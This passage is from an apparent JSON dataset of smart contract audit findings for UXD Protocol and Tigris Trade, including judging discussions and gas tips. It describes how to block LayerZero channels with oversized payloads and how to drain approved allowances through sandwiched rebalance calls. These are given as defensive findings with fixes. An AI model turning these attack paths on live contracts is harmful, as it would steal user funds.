high utilization and the collateral is inaccessible\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/rage-trade/RageDnDepository.sol#L99-L115\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nI recommend three safeguards against this:\n1) Monitor the current utilization of the senior vault and limit deposits if utilization is close to locking positions\n2) Maintain a portion of the USDC deposits outside the vault (i.e. 10%) to avoid sudden potential liquidity crunches\n3) Create functions to balance the proportions of USDC in and out of the vault to withdraw USDC from the vault in the event that utilization threatens to lock collateral\n\n## Discussion\n\n**WarTech9**\n\nPossible usecase for insurance fund.\n\n**acamill**\n\nThis is the main downside of using not fully liquid strategies for the ALM model, upside being higher yield. \nWe can mitigate this issue with buffers but that's always an issue, and adding buffers with either protocol funds or insurance fund is equivalent to using lower yield strategies, as such not an ideal solution either. (and it add complexity)\n\nMy personal opinion is to keep the cap on the illiquid strategy to be low enough relative to the total circulating UXD, that way keeping the high yield but reducing the liquidity crunch issue.\nThat's what we are currently doing on Solana, working on smarter rebalancing and better risk management to keep these cap relevant.",
      "summary": "\nA bug report has been filed concerning RageTrade senior vault USDC deposits. This vault is subject to utilization caps which can lock deposits for long periods of time, leading to UXD instability. This was found by four people: clems4ever, ctf\\_sec, 0x52, and 0xNazgul. \n\nThe problem lies in the code of DnGmxSeniorVault.sol, which has a function that reverts withdrawals if they lower the utilization of the vault below a certain threshold. This could cause a liquidity crunch if large deposits are required to maintain the stability of UXD. \n\nThe impact of this bug is that UXD may become destabilized if the senior vault has high utilization and the collateral is inaccessible. To address this, three safeguards have been recommended: monitor the current utilization of the senior vault and limit deposits if utilization is close to locking positions, maintain a portion of the USDC deposits outside the vault, and create functions to balance the proportions of USDC in and out of the vault. \n\nWarTech9 suggested the possible use of an insurance fund, while acamill suggested that the cap on the illiquid strategy be kept low enough relative to the total circulating UXD, in order to maintain high yield while reducing the liquidity crunch issue.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/253",
      "tags": [
        "Min/Max Cap Validation",
        "Business Logic"
      ],
      "finders": [
        "clems4ever",
        "0x52",
        "0xNazgul",
        "ctf\\_sec"
      ]
    },
    {
      "id": "6253",
      "title": "H-2: Malicious user can use an excessively large _toAddress in OFTCore#sendFrom to break layerZero communication",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/270 \n\n## Found by \n0x52\n\n## Summary\n\nBy default layerZero implements a blocking behavior, that is, that each message must be processed and succeed in the order that it was sent. In order to circumvent this behavior the receiver must implement their own try-catch pattern. If the try-catch pattern in the receiving app ever fails then it will revert to its blocking behavior. The _toAddress input to OFTCore#sendFrom is calldata of any arbitrary length. An attacker can abuse this and submit a send request with an excessively large _toAddress to break communication between network with different gas limits.\n\n## Vulnerability Detail\n\n    function sendFrom(address _from, uint16 _dstChainId, bytes calldata _toAddress, uint _amount, address payable _refundAddress, address _zroPaymentAddress, bytes calldata _adapterParams) public payable virtual override {\n        _send(_from, _dstChainId, _toAddress, _amount, _refundAddress, _zroPaymentAddress, _adapterParams);\n    }\n\nThe _toAddress input to OFTCore#sendFrom is a bytes calldata of any arbitrary size. This can be used as follows to break communication between chains that have different block gas limits.\n\nExample:\nLet's say that an attacker wishes to permanently block the channel Arbitrum -> Optimism. Arbitrum has a massive gas block limit, much higher than Optimism's 20M block gas limit. The attacker would call sendFrom on the Arbitrum chain with the Optimism chain as the destination. For the _toAddress input they would use an absolutely massive amount of bytes. This would be packed into the payload which would be called on Optimism. Since Arbitrum has a huge gas limit the transaction would send from the Arbitrum side but it would be so big that the transaction could never succeed on the Optimism side due to gas constraints. Since that nonce can never succeed the communication channel will be permanently blocked at the Optimism endpoint, bypassing the nonblocking behavior implemented in the OFT design and reverting to the default blocking behavior of layerZero.\n\nUsers can still send messages and burn their tokens from Arbitrum -> Optimism but the messages can never be received. This could be done between any two chain in which one has a higher block gas limit. This would cause massive loss of funds and completely cripple the entire protocol.\n\n## Impact\n\nMassive loss of user funds and protocol completely crippled\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/external/layer-zero/token/oft/OFTCore.sol#L31-L33\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nLimit the length of _toAddress to some amount (i.e. 256 bytes) as of right now EVM uses 20 bytes address and Sol/Aptos use 32 bytes address, so for right now it could be limited to 32 bytes.\n\n        function sendFrom(address _from, uint16 _dstChainId, bytes calldata _toAddress, uint _amount, address payable _refundAddress, address _zroPaymentAddress, bytes calldata _adapterParams) public payable virtual override {\n    +       require(_toAddress.length <= maxAddressLength);       \n            _send(_from, _dstChainId, _toAddress, _amount, _refundAddress, _zroPaymentAddress, _adapterParams);\n        }\n\n## Discussion\n\n**WarTech9**\n\nWe are using  a non blocking receiver with both UXP and UXD tokens inheriting from the `OFTV2Core` base contract. Thus when a message is received `nonBlockingLzReceive` function is called which does not block the channel between 2 chains if an error occurs. \n\nPlease provide more details if you feel otherwise.\n\n**0x00052**\n\nCorrect you do use a non-blocking but using a huge _toAddress will cause the function to revert before the non-blocking error handling. \n\n    function receivePayload(uint16 _srcChainId, bytes calldata _srcAddress, address _dstAddress, uint64 _nonce, uint _gasLimit, bytes calldata _payload) external override receiveNonReentrant {\n        // assert and increment the nonce. no message shuffling\n        require(_nonce == ++inboundNonce[_srcChainId][_srcAddress], \"LayerZero: wrong nonce\");\n\n        LibraryConfig storage uaConfig = uaConfigLookup[_dstAddress];\n\n        // authentication to prevent cross-version message validation\n        // protects against a malicious library from passing arbitrary data\n        if (uaConfig.receiveVersion == DEFAULT_VERSION) {\n            require(defaultReceiveLibraryAddress == msg.sender, \"LayerZero: invalid default library\");\n        } else {\n            require(uaConfig.receiveLibraryAddress == msg.sender, \"LayerZero: invalid library\");\n        }\n\n        // block if any message blocking\n        StoredPayload storage sp = storedPayload[_srcChainId][_srcAddress];\n        require(sp.payloadHash == bytes32(0), \"LayerZero: in message blocking\");\n\n        try ILayerZeroReceiver(_dstAddress).lzReceive{gas: _gasLimit}(_srcChainId, _srcAddress, _nonce, _payload) {\n            // success, do nothing, end of the message delivery\n        } catch (bytes memory reason) {\n            // revert nonce if any uncaught errors/exceptions if the ua chooses the blocking mode\n            storedPayload[_srcChainId][_srcAddress] = StoredPayload(uint64(_payload.length), _dstAddress, keccak256(_payload));\n            emit PayloadStored(_srcChainId, _srcAddress, _dstAddress, _nonce, _payload, reason);\n        }\n    }\n\nAbove is the code run on the endpoint. It will use the try statement to call the lzReceive on the non-blocking app. Due to the huge amount of calldata the try function will immediately revert because it will run out of gas. This bypasses all the logic of the app and causes the checkpoint to store the payload, blocking the channel\n\n**hrishibhat**\n\n@WarTech9 \n\n**WarTech9**\n\nThe message is only stored if the `catch` block is executed. In your example, if a huge amount of data is passed in the receive function would run out of gas before that gets executed. Secondly, the transaction would revert within the `catch` block itself if the payload is too huge as a result of a huge `_dstAddress` being passed in, thus, message would not be stored and channel would not be blocked. \n\n**WarTech9**\n\nThere could be some value in adding input size validation at source as recommended, since the size could be arbitrary. But this issue is medium/low risk\n\n**0x00052**\n\n    // assert and increment the nonce. no message shuffling    \n    require(_nonce == ++inboundNonce[_srcChainId][_srcAddress], \"LayerZero: wrong nonce\");\n    \nThis line in endpoint requires that the nonce is sequential so if the message is too big to be executed at all then it will also block the channel even without being stored. As an example if the message with nonce == 1 cannot be executed at all due to gas limits then the channel would also be blocked because trying to execute nonce == 2 would always revert at that statement.\n\n    function send(uint16 _dstChainId, bytes calldata _destination, bytes calldata _payload, address payable _refundAddress, address _zroPaymentAddress, bytes calldata _adapterParams) external payable override sendNonReentrant {\n        LibraryConfig storage uaConfig = uaConfigLookup[msg.sender];\n        uint64 nonce = ++outboundNonce[_dstChainId][msg.sender];\n        _getSendLibrary(uaConfig).send{value: msg.value}(msg.sender, nonce, _dstChainId, _destination, _payload, _refundAddress, _zroPaymentAddress, _adapterParams);\n    }\n\nThe nonce of the message is set on the sending end of the endpoint so it's impossible to work around a nonce that can't execute.\n\n`Secondly, the transaction would revert within the catch block itself if the payload is too huge as a result of a huge _dstAddress being passed in, thus, message would not be stored and channel would not be blocked.`\n\nThis is not true either because the _dstAddress is not the same as _toAddress passed into the OFTCore#sendFrom. _toAddress is packed into the payload of the message and the dstAddress is set by [_lzSend](https://github.com/sherlock-audit/2023-01-uxd-0x00052/blob/main/contracts/external/layer-zero/lzApp/LzApp.sol#L45-L49):\n\n    function _lzSend(uint16 _dstChainId, bytes memory _payload, address payable _refundAddress, address _zroPaymentAddress, bytes memory _adapterParams, uint _nativeFee) internal virtual {\n        bytes memory trustedRemote = trustedRemoteLookup[_dstChainId];\n        require(trustedRemote.length != 0, \"LzApp: destination chain is not a trusted source\");\n        lzEndpoint.send{value: _nativeFee}(_dstChainId, trustedRemote //@audit _dstAddress, _payload, _refundAddress, _zroPaymentAddress, _adapterParams);\n    }\n\nThe destination address would be the address of the receiving contract (normal sized). Additionally when the message is stored, it only stores the hash of the message so it doesn't require a huge amount of gas to store.\n\n**hrishibhat**\n\nConsidering this a valid high issue based on the above comments. \n\n**0xIryna**\n\nLayerZero team is here. Thank you for digging into this!\nWe have a max payload size (10000) set in our `RelayerV2` contract which prevents the described situation (the contract isnt verified, but you can fork a chain and test). If a payload exceeds the specified limit the transaction will revert on the source.\nIf a client application is configured to use a non-default Relayer it must set the payload limit itself.  Generally, we believe its a protocols responsibility to enforce the max payload size.\n\n**berndartmueller**\n\nEscalate for 10 USDC\n\nConsider the response from the LayerZero team above to reconsider the severity and validity of this issue. If UXD uses the `RelayerV2` contract provided by LayerZero, this is a non-issue.\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> Consider the response from the LayerZero team above to reconsider the severity and validity of this issue. If UXD uses the `RelayerV2` contract provided by LayerZero, this is a non-issue.\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**rvierdiyev**\n\nEscalate for 15 usdc. \nIncreased amount just to make sure this will be rechecked.\n\n**sherlock-admin**\n\n > Escalate for 15 usdc. \n> Increased amount just to make sure this will be rechecked.\n\nYou've created a valid escalation for 15 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation rejected\n\nComment from Layer Zero shows that there is a valid risk from payload which is now fixed:\nhttps://github.com/LayerZero-Labs/LayerZero/pull/24/commits\nThe relayer did not seem have a check for max payload size previously. \n\nAdditionally as suggested by the LZ  \n> we believe its a protocols responsibility to enforce the max payload size.\n\n**sherlock-admin**\n\n> Escalation rejected\n> \n> Comment from Layer Zero shows that there is a valid risk from payload which is now fixed:\n> https://github.com/LayerZero-Labs/LayerZero/pull/24/commits\n> The relayer did not seem have a check for max payload size previously. \n> \n> Additionally as suggested by the LZ  \n> > we believe its a protocols responsibility to enforce the max payload size.\n\nThis issue's escalations have been rejected!\n\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "summary": "\nThis bug report is about an issue found in the OFTCore#sendFrom contract, which is part of the LayerZero protocol. The issue is that malicious users can use an excessively large _toAddress input to OFTCore#sendFrom, which is a bytes calldata of any arbitrary size, to break communication between networks with different gas limits. This would cause massive loss of funds and completely cripple the entire protocol. \n\nThe bug was found by 0x52 and the code snippet can be found at https://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/external/layer-zero/token/oft/OFTCore.sol#L31-L33. The tool used was manual review.\n\nThe recommendation was to limit the length of _toAddress to some amount (i.e. 256 bytes) as of right now EVM uses 20 bytes address and Sol/Aptos use 32 bytes address, so for right now it could be limited to 32 bytes.\n\nWarTech9 commented that the message is only stored if the catch block is executed and 0x00052 responded that the nonce of the message is set on the sending end of the endpoint so it's impossible to work around a nonce that can't execute. 0xIryna from the LayerZero team added that they have a max payload size (10000) set in their `RelayerV2` contract which prevents the described situation.\n\nTwo Watsons, berndartmueller and rvierdiyev, escalated the issue for 10 and 15 USDC respectively. However, hrishibhat rejected the escalation as Layer Zero showed that there is a valid risk from payload which is now fixed and it's the protocol's responsibility to enforce the max payload size. Therefore, the escalations were rejected and the Watsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "quality_score": 3.2,
      "rarity_score": 3.6,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/270",
      "tags": [
        "LayerZero",
        "Gas Limit"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "6252",
      "title": "H-1: PerpDespository#reblance and rebalanceLite can be called to drain funds from anyone who has approved PerpDepository",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/288 \n\n## Found by \nclems4ever, dipp, 0xNazgul, DecorativePineapple, ctf\\_sec, unforgiven, 0x52, ck, HollaDieWaldfee, GimelSec, chiranz, berndartmueller, yixxas, Zarf, carrot, koxuan, hl\\_, Ruhum, kankodu, Bahurum\n\n## Summary\n\nPerpDespository#reblance and rebalanceLite allows anyone to specify the account that pays the quote token. These functions allow a malicious user to abuse any allowance provided to PerpDirectory. rebalance is the worst of the two because the malicious user could sandwich attack the rebalance to steal all the funds and force the unsuspecting user to pay the `shortfall`.\n\n## Vulnerability Detail\n\n    function rebalance(\n        uint256 amount,\n        uint256 amountOutMinimum,\n        uint160 sqrtPriceLimitX96,\n        uint24 swapPoolFee,\n        int8 polarity,\n        address account // @audit user specified payer\n    ) external nonReentrant returns (uint256, uint256) {\n        if (polarity == -1) {\n            return\n                _rebalanceNegativePnlWithSwap(\n                    amount,\n                    amountOutMinimum,\n                    sqrtPriceLimitX96,\n                    swapPoolFee,\n                    account // @audit user address passed directly\n                );\n        } else if (polarity == 1) {\n            // disable rebalancing positive PnL\n            revert PositivePnlRebalanceDisabled(msg.sender);\n            // return _rebalancePositivePnlWithSwap(amount, amountOutMinimum, sqrtPriceLimitX96, swapPoolFee, account);\n        } else {\n            revert InvalidRebalance(polarity);\n        }\n    }\n\n`rebalance` is an unpermissioned function that allows anyone to call and rebalance the PNL of the depository. It allows the caller to specify the an account that passes directly through to `_rebalanceNegativePnlWithSwap`\n\n    function _rebalanceNegativePnlWithSwap(\n        uint256 amount,\n        uint256 amountOutMinimum,\n        uint160 sqrtPriceLimitX96,\n        uint24 swapPoolFee,\n        address account\n    ) private returns (uint256, uint256) {\n        ...\n        // @audit this uses user supplied swap parameters which can be malicious\n        SwapParams memory params = SwapParams({\n            tokenIn: assetToken,\n            tokenOut: quoteToken,\n            amountIn: baseAmount,\n            amountOutMinimum: amountOutMinimum,\n            sqrtPriceLimitX96: sqrtPriceLimitX96,\n            poolFee: swapPoolFee\n        });\n        uint256 quoteAmountOut = spotSwapper.swapExactInput(params);\n        int256 shortFall = int256(\n            quoteAmount.fromDecimalToDecimal(18, ERC20(quoteToken).decimals())\n        ) - int256(quoteAmountOut);\n        if (shortFall > 0) {\n            // @audit shortfall is taken from account specified by user\n            IERC20(quoteToken).transferFrom(\n                account,\n                address(this),\n                uint256(shortFall)\n            );\n        } else if (shortFall < 0) {\n            ...\n        }\n        vault.deposit(quoteToken, quoteAmount);\n\n        emit Rebalanced(baseAmount, quoteAmount, shortFall);\n        return (baseAmount, quoteAmount);\n    }\n\n`_rebalanceNegativePnlWithSwap` uses both user specified swap parameters and takes the shortfall from the account specified by the user. This is where the function can be abused to steal funds from any user that sets an allowance for this contract. A malicious user can sandwich attack the swap and specify malicious swap parameters to allow them to steal the entire rebalance. This creates a large shortfall which will be taken from the account that they specify, effectively stealing the funds from the user. \n\nExample:\nAny account that gives the depository allowance can be stolen from. Imagine the following scenario. The multisig is going to rebalance the contract for 15000 USDC worth of ETH and based on current market conditions they are estimating that there will be a 1000 USDC shortfall because of the difference between the perpetual and spot prices (divergences between spot and perpetual price are common in trending markets). They first approve the depository for 1000 USDC. A malicious user sees this approval and immediately submits a transaction of their own. They request to rebalance only 1000 USDC worth of ETH and sandwich attack the swap to steal the rebalance. They specify the multisig as `account` and force it to pay the 1000 USDC shortfall and burn their entire allowance, stealing the USDC.\n\n## Impact\n\nAnyone that gives the depository allowance can easily have their entire allowance stolen\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L478-L528\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nPerpDespository#reblance and rebalanceLite should use msg.sender instead of account:\n\n         function rebalance(\n            uint256 amount,\n            uint256 amountOutMinimum,\n            uint160 sqrtPriceLimitX96,\n            uint24 swapPoolFee,\n            int8 polarity,\n    -       address account\n        ) external nonReentrant returns (uint256, uint256) {\n            if (polarity == -1) {\n                return\n                    _rebalanceNegativePnlWithSwap(\n                        amount,\n                        amountOutMinimum,\n                        sqrtPriceLimitX96,\n                        swapPoolFee,\n    -                   account \n    +                   msg.sender\n                    );\n            } else if (polarity == 1) {\n                // disable rebalancing positive PnL\n                revert PositivePnlRebalanceDisabled(msg.sender);\n                // return _rebalancePositivePnlWithSwap(amount, amountOutMinimum, sqrtPriceLimitX96, swapPoolFee, account);\n            } else {\n                revert InvalidRebalance(polarity);\n            }\n        }",
      "summary": "\nThis bug report details a vulnerability found in the PerpDespository#reblance and rebalanceLite functions. These functions allow anyone to specify the account that pays the quote token, which can be abused by a malicious user to steal any allowance provided to PerpDirectory. This is done by sandwich attacking the rebalance and specifying malicious swap parameters to force the unsuspecting user to pay the `shortfall`. This creates a large shortfall which will be taken from the account that they specify, effectively stealing the funds from the user. \n\nThis vulnerability was found by clems4ever, dipp, 0xNazgul, DecorativePineapple, ctf\\_sec, unforgiven, 0x52, ck, HollaDieWaldfee, GimelSec, chiranz, berndartmueller, yixxas, Zarf, carrot, koxuan, hl\\_, Ruhum, kankodu, Bahurum and was detected through manual review.\n\nThe impact of this vulnerability is that anyone that gives the depository allowance can easily have their entire allowance stolen.\n\nThe code snippet of the vulnerability can be found at https://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L478-L528.\n\nThe recommendation to fix this vulnerability is to use msg.sender instead of account.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/288",
      "tags": [
        "Business Logic",
        "Allowance"
      ],
      "finders": [
        "clems4ever",
        "DecorativePineapple",
        "0x52",
        "HollaDieWaldfee",
        "yixxas",
        "carrot",
        "kankodu",
        "koxuan",
        "berndartmueller",
        "Zarf",
        "ctf\\_sec",
        "0xNazgul",
        "Bahurum",
        "Ruhum",
        "dipp",
        "unforgiven",
        "GimelSec",
        "hl\\_",
        "ck",
        "chiranz"
      ]
    },
    {
      "id": "43223",
      "title": "[G-30]  Use custom errors rather than `revert()`/`require()` strings to save gas",
      "impact": "GAS",
      "content": "Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas\n\n*There are 64 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n/// @audit (valid but excluded finding)\n63:           require(allowedAsset[_asset], \"!Asset\");\n\n/// @audit (valid but excluded finding)\n106:          require(bond.owner == _sender, \"!owner\");\n\n/// @audit (valid but excluded finding)\n107:          require(!bond.expired, \"Expired\");\n\n/// @audit (valid but excluded finding)\n108:          require(bond.asset == _asset, \"!BondAsset\");\n\n/// @audit (valid but excluded finding)\n110:          require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");\n\n/// @audit (valid but excluded finding)\n111:          require(bond.period+_period <= 365, \"MAX PERIOD\");\n\n/// @audit (valid but excluded finding)\n142:          require(bond.expired, \"!expire\");\n\n/// @audit (valid but excluded finding)\n145:                  require(bond.expireEpoch + 7 < epoch[bond.asset], \"Bond owner priority\");\n\n/// @audit (valid but excluded finding)\n173:          require(_claimer == bond.owner, \"!owner\");\n\n/// @audit (valid but excluded finding)\n329:          require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");\n\n/// @audit (valid but excluded finding)\n330:          require(!bond.expired, \"Expired!\");\n\n/// @audit (valid but excluded finding)\n332:              require(block.timestamp > bond.mintTime + 300, \"Recent update\");\n\n/// @audit (valid but excluded finding)\n350:          require(assets.length == 0 || assets[assetsIndex[_asset]] != _asset, \"Already added\");\n\n/// @audit (valid but excluded finding)\n358:          require(assets[assetsIndex[_asset]] == _asset, \"Not added\");\n\n/// @audit (valid but excluded finding)\n373:          require(msg.sender == manager, \"!manager\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L63\n\n```solidity\nFile: contracts/GovNFT.sol\n\n/// @audit (valid but excluded finding)\n51:           require(counter <= MAX, \"Exceeds supply\");\n\n/// @audit (valid but excluded finding)\n65:           require(msg.sender == address(this) || _msgSender() == owner(), \"NotBridge\");\n\n/// @audit (valid but excluded finding)\n66:           require(tokenId <= 10000, \"BadID\");\n\n/// @audit (valid but excluded finding)\n94:           require(ownerOf(tokenId) == from, \"!Owner\");\n\n/// @audit (valid but excluded finding)\n130:          require(tokenId.length > 0, \"Not bridging\");\n\n/// @audit (valid but excluded finding)\n132:              require(_msgSender() == ownerOf(tokenId[i]), \"Not the owner\");\n\n/// @audit (valid but excluded finding)\n140:          require(isTrustedAddress[_dstChainId][targetAddress], \"!Trusted\");\n\n/// @audit (valid but excluded finding)\n174:          require(_msgSender() == address(endpoint), \"!Endpoint\");\n\n/// @audit (valid but excluded finding)\n185:          require(msg.sender == address(this), \"NonblockingLzApp: caller must be app\");\n\n/// @audit (valid but excluded finding)\n194:          require(isTrustedAddress[_srcChainId][fromAddress], \"!TrustedAddress\");\n\n/// @audit (valid but excluded finding)\n209:          require(payloadHash != bytes32(0), \"NonblockingLzApp: no stored message\");\n\n/// @audit (valid but excluded finding)\n210:          require(keccak256(_payload) == payloadHash, \"NonblockingLzApp: invalid payload\");\n\n/// @audit (valid but excluded finding)\n241:          require(address(_endpoint) != address(0), \"ZeroAddress\");\n\n/// @audit (valid but excluded finding)\n301:          require(assets.length == 0 || assets[assetsIndex[_asset]] != _asset, \"Already added\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L51\n\n```solidity\nFile: contracts/Lock.sol\n\n/// @audit (valid but excluded finding)\n66:           require(_period <= maxPeriod, \"MAX PERIOD\");\n\n/// @audit (valid but excluded finding)\n67:           require(_period >= minPeriod, \"MIN PERIOD\");\n\n/// @audit (valid but excluded finding)\n68:           require(allowedAssets[_asset], \"!asset\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L66\n\n```solidity\nFile: contracts/PairsContract.sol\n\n/// @audit (valid but excluded finding)\n35:           require(_name.length > 0, \"!Asset\");\n\n/// @audit (valid but excluded finding)\n50:           require(_assetName.length == 0, \"Already exists\");\n\n/// @audit (valid but excluded finding)\n51:           require(bytes(_name).length > 0, \"No name\");\n\n/// @audit (valid but excluded finding)\n52:           require(_maxLeverage >= _minLeverage && _minLeverage > 0, \"Wrong leverage values\");\n\n/// @audit (valid but excluded finding)\n75:           require(_name.length > 0, \"!Asset\");\n\n/// @audit (valid but excluded finding)\n84:           require(_idToAsset[_asset].maxLeverage >= _idToAsset[_asset].minLeverage, \"Wrong leverage values\");\n\n/// @audit (valid but excluded finding)\n94:           require(_name.length > 0, \"!Asset\");\n\n/// @audit (valid but excluded finding)\n95:           require(_baseFundingRate <= maxBaseFundingRate, \"baseFundingRate too high\");\n\n/// @audit (valid but excluded finding)\n106:          require(_name.length > 0, \"!Asset\");\n\n/// @audit (valid but excluded finding)\n117:          require(_name.length > 0, \"!Asset\");\n\n/// @audit (valid but excluded finding)\n141:          require(_name.length > 0, \"!Asset\");\n\n/// @audit (valid but excluded finding)\n157:              require(_idToOi[_asset][_tigAsset].longOi <= _idToOi[_asset][_tigAsset].maxOi || _idToOi[_asset][_tigAsset].maxOi == 0, \"MaxLongOi\");\n\n/// @audit (valid but excluded finding)\n177:              require(_idToOi[_asset][_tigAsset].shortOi <= _idToOi[_asset][_tigAsset].maxOi || _idToOi[_asset][_tigAsset].maxOi == 0, \"MaxShortOi\");\n\n/// @audit (valid but excluded finding)\n190:          require(_msgSender() == address(protocol), \"!Protocol\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L35\n\n```solidity\nFile: contracts/Position.sol\n\n/// @audit (valid but excluded finding)\n315:          require(_isMinter[_msgSender()], \"!Minter\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L315\n\n```solidity\nFile: contracts/Referrals.sol\n\n/// @audit (valid but excluded finding)\n21:           require(_referral[_hash] == address(0), \"Referral code already exists\");\n\n/// @audit (valid but excluded finding)\n81:           require(_msgSender() == address(protocol), \"!Protocol\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L21\n\n```solidity\nFile: contracts/StableToken.sol\n\n/// @audit (valid but excluded finding)\n52:           require(isMinter[_msgSender()], \"!Minter\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L52\n\n```solidity\nFile: contracts/StableVault.sol\n\n/// @audit (valid but excluded finding)\n45:           require(allowed[_token], \"Token not listed\");\n\n/// @audit (valid but excluded finding)\n79:           require(!allowed[_token], \"Already added\");\n\n/// @audit (valid but excluded finding)\n90:           require(allowed[_token], \"Not added\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L45\n\n```solidity\nFile: contracts/TradingExtension.sol\n\n/// @audit (valid but excluded finding)\n279:          require(msg.sender == trading, \"!protocol\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L279\n\n```solidity\nFile: contracts/Trading.sol\n\n/// @audit (valid but excluded finding)\n876:          require(allowedVault[_stableVault], \"Unapproved stablevault\");\n\n/// @audit (valid but excluded finding)\n877:          require(_token == IStableVault(_stableVault).stable() || IStableVault(_stableVault).allowed(_token), \"Token not approved in vault\");\n\n/// @audit (valid but excluded finding)\n887:              require(_proxy.proxy == _msgSender() && _proxy.time >= block.timestamp, \"Proxy not approved\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L876\n\n```solidity\nFile: contracts/utils/TradingLibrary.sol\n\n/// @audit (valid but excluded finding)\n105:          require(_provider == _priceData.provider, \"BadSig\");\n\n/// @audit (valid but excluded finding)\n106:          require(_isNode[_provider], \"!Node\");\n\n/// @audit (valid but excluded finding)\n107:          require(_asset == _priceData.asset, \"!Asset\");\n\n/// @audit (valid but excluded finding)\n108:          require(!_priceData.isClosed, \"Closed\");\n\n/// @audit (valid but excluded finding)\n109:          require(block.timestamp >= _priceData.timestamp, \"FutSig\");\n\n/// @audit (valid but excluded finding)\n110:          require(block.timestamp <= _priceData.timestamp + _validSignatureTimer, \"ExpSig\");\n\n/// @audit (valid but excluded finding)\n111:          require(_priceData.price > 0, \"NoPrice\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L105\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43222",
      "title": "[G-29]  Using `private` rather than `public` for constants, saves gas",
      "impact": "GAS",
      "content": "If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table\n\n*There are 3 instances of this issue:*\n\n```solidity\nFile: contracts/Lock.sol\n\n/// @audit (valid but excluded finding)\n12:       uint public constant minPeriod = 7;\n\n/// @audit (valid but excluded finding)\n13:       uint public constant maxPeriod = 365;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L12\n\n```solidity\nFile: contracts/Position.sol\n\n/// @audit (valid but excluded finding)\n16:       uint constant public DIVISION_CONSTANT = 1e10; // 